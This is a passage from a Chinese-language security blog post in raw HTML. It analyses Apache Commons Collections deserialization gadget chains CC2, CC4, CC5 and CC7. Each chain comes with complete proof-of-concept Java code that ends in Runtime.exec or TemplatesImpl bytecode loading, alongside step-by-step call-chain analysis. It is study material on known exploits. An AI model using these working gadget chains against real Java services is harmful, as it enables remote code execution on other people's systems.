class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//反射获取成员变量的field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//获取访问权限</span></span><br><span class="line">        field.set(queue,comparator);<span class="comment">//设置参数</span></span><br></pre></td></tr></table></figure><p>通过poc我们发现后半部分也是用的也是invokertransformer进行触发的，这里主要看前半部分怎么调用的</p><p>还是通过跟是谁transform方法我们找到了TransformingComparator这个类中的compare方法调用了transform方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718150278-b61e0267-8fc1-42a8-a328-6bd031a8d11e.png" alt=""></p><p>所以我们只需将trangsformer变成invokertransformer对象就可以rce了</p><p>再来看看其构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718263591-c880068a-15be-4705-9b86-c3c6f2bf29d5.png" alt=""></p><p>可以看到transformer是可控的所以我们现在需要找到能够触发compare的方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718373798-aaecb373-63f9-4b95-b6fc-615b6b0ce0ed.png" alt=""></p><p>我们找到了PriorityQueue类中的siftDownUsingComparator方法调用了compare方法，这里看下构造方法发现comparator也是可控的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718478028-692020a7-c1e9-47d5-b72f-e696f05b1e56.png" alt=""></p><p>所以现在需要找到可以触发siftDownUsingComparator的方法我们发现在本类的siftDown方法调用了该方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718872060-36c80a00-7650-457e-857f-f5aa9a5d74bd.png" alt=""></p><p>并且在本类的readObject中发现heapify调用了siftDown方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718555670-e74f356c-5991-4662-b0fa-d3ba3008b81f.png" alt=""></p><p>并且该size需要大于等于2才可以进入for循环所以可以构造poc了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br></pre></td></tr></table></figure><p>运行发现在序列化之前就触发了原因在于add方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718641827-ee67f3d4-9524-4118-88f3-30134d1b30a5.png" alt=""></p><p>调用了offer方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718669019-1053aa9e-85c4-448d-98bf-30f88a2a5086.png" alt=""></p><p>该方法又调用了siftUp方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718687690-eec61593-5bfb-4225-b5ea-20ca9ff9089d.png" alt=""></p><p>发现在该方法中也调用了siftDownUsingComparator方法所以我们需要在add的时候将comparartor让其值为空，在add之后在反射将其值该为TransformingComparator对象就行poc如开头所示</p><h3 id="cc2-调用链">cc2 调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740045347-efcf625e-3fc6-400e-b021-6d8b84d8e192.png" alt=""></p><h3 id="调用方式2">调用方式2</h3><p>第二种调用方法就是结合CC3中所介绍到的动态加载字节码的形式进行触发rce，因为通过上文分析的我们知道cc2会在TransformingComparator这个类中的compare方法中调用transform方法，所以这里我们想到利用Invokertransform这个类中的transform方法来调用任意类的方法，也就是通过在这里注入invokertransform对象调用transform方法在调用TemplateImpl中的newTransformer方法来进而触发动态类加载实现rce。</p><p>这里给出poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获取 class 对象</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line">       <span class="type">InvokerTransformer</span> <span class="variable">invokertransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;&#125;);</span><br><span class="line">       <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">       <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">       queue.add(templates);</span><br><span class="line">       queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>).getDeclaredField(<span class="string">&quot;transformer&quot;</span>);<span class="comment">//反射获取成员变量的field</span></span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);<span class="comment">//获取访问权限</span></span><br><span class="line">       field.set(comparator,invokertransformer);<span class="comment">//设置参数</span></span><br><span class="line">       <span class="comment">//serialize(queue);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>其实通过poc我们能够发现就是将最后改成动态调用newTransformer方法。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732359599-e550a791-ad16-48a8-baa8-89915e90bca2.png" alt=""></p><h4 id="问题1：">问题1：</h4><p>这里其实我们很容易想明白就是利用invokertransform的transform方法去动态调用newTransformer方法但是你执行会发现报错找不到这个方法，是因为我们并没有将该方法的类对象传递进去这里如何不利用ChainedTransformer进行传递呢</p><p>通过调试我们可以通过add方法进行添加</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732743981-a67b8b99-d4cd-4898-8565-fb99f2d7e1b4.png" alt=""></p><p>他会传入到offer里面，offer会继续调用 siftUp方法</p><p>继续将我们传入的参数放进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732814267-bc951645-86cb-4e72-beb6-3fd050fa821d.png" alt=""></p><p>可以看到已经是被传递进来了。</p><h4 id="问题2：">问题2：</h4><p>然后我们发现我们的poc在一开始的时候并没有将一个真的invokertransformer放进去<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732918709-a4c299c3-83cc-4390-94b8-03cb0e133357.png" alt=""></p><p>而是在add之后通过反射修改了其值，这里上文也说了是为了防止在add时触发rce。</p><h4 id="问题3：">问题3：</h4><p>就是我们在add的时候需要传入两个templates对象吗，这里经过实验只需要对第一个传入即可，并且第一个必须传入。我们来调试看看为什么我们以只传入第一个templates对象为例进行反序列化调试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733177259-e939a2b9-9259-44af-95c4-092e61efe2ba.png" alt=""></p><p>在反序列化的时候可以看到它获取的是第一个传递的参数的值</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733194896-b2c9ae69-ef70-4c7b-a581-58effd95e190.png" alt="">继续跟进发现确实取出来的是第一个参数的值</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733235272-4a1546c9-d040-42f1-86c9-7352f7293085.png" alt=""></p><p>这里调用的也确实是x的值，结合前面两个方法分析说明第一个参数必须传入templates对象。</p><h3 id="cc2-TemplatesImpl调用链">cc2 TemplatesImpl调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740139727-d5bf08f6-e29f-4937-9eaa-82a02296e5c5.png" alt=""></p><h2 id="java-cc4链">java  cc4链</h2><p>其实如果搞懂了cc2 和 cc3 两条链，cc4链就没啥难度了，它就是这俩的结合具体分析看cc2 与cc3</p><h3 id="cc4调用链">cc4调用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.heapify()</span><br><span class="line">PriorityQueue.siftDown()</span><br><span class="line">PriorityQueue.siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter.TrAXFilter()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br></pre></td></tr></table></figure><p>贴出poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后半段用的是cc3</span></span><br><span class="line">        <span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line">        <span class="comment">// 触发方法</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span> [] &#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span> [] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//前半段是cc2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>).getDeclaredField(<span class="string">&quot;transformer&quot;</span>);<span class="comment">//反射获取成员变量的field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//获取访问权限</span></span><br><span class="line">        field.set(comparator,chainedTransformer);<span class="comment">//设置参数</span></span><br><span class="line">        <span class="comment">//serialize(queue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="java-cc5链">java cc5链</h2><p>cc5的调用链和cc1 lazyMap调用链很相似，只不过cc5调用链最后触发get方法那里变成了TiedMapEntry的toString方法，然后利用BadAttributeValueExpException的readObject触发。</p><p>看一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;11&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        <span class="comment">//serialize(badAttributeValueExpException);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>通过poc我们发现直到lazyMap都是和cc1一样的调用，后面从Proxy改成了TiedMapEntry类</p><p>我们知道触发该条链是需要触发到LazyMap的get方法我们调试一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743599823-bddea8e9-0437-4c54-af01-80ba9066a9eb.png" alt=""></p><p>我们找到了TiedMapEntry类里面的toString方法中调用了 getValue方法。这个有点熟悉在cc6中出现过跟到getValue中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743660503-cd5c9bc1-8c39-46cf-b740-28dbd39bbed1.png" alt=""></p><p>发现调用了 get方法而我们在cc6中已将知道TiedMapEntry类的构造方法是可以直接对map这个属性进行赋值的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743712373-34322b83-7a98-4342-b42d-288737acc8f4.png" alt=""></p><p>所以这里只需要找到可以触发该类toString的方法就可以</p><p>继续调试我们发现了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743765500-03b8b2ed-d1f5-4333-a121-ea4abb10fa02.png" alt="">在BadAttributeValueExpException这个类的readObject中发现了调用了toString方法是由valObj触发的而valObj则是获得val属性的值，然后看看其构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743831365-8c298754-31a8-4aa8-8fa4-cb28ef460830.png" alt=""></p><p>发现val是可控的，但是发现在构造方法里也调用了toString方法，所以在构造的时候不能传入TiedMapEntry对象，因为这回导致在序列化前就会rce所以我们需要在实例化完之后反射修改其属性值就可以了。</p><h3 id="cc5调用链">cc5调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714744407880-2899e688-e3e0-4ee2-bf22-275798698aa0.png" alt=""></p><h2 id="java-cc7链">java  cc7链</h2><p>其实该条利用链和cc5也是大同小异，也是利用LazyMap去触发的，只不过入口点换成了Hashtable</p><p>我们先来直接看看网上的poc然后跟着分析分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span 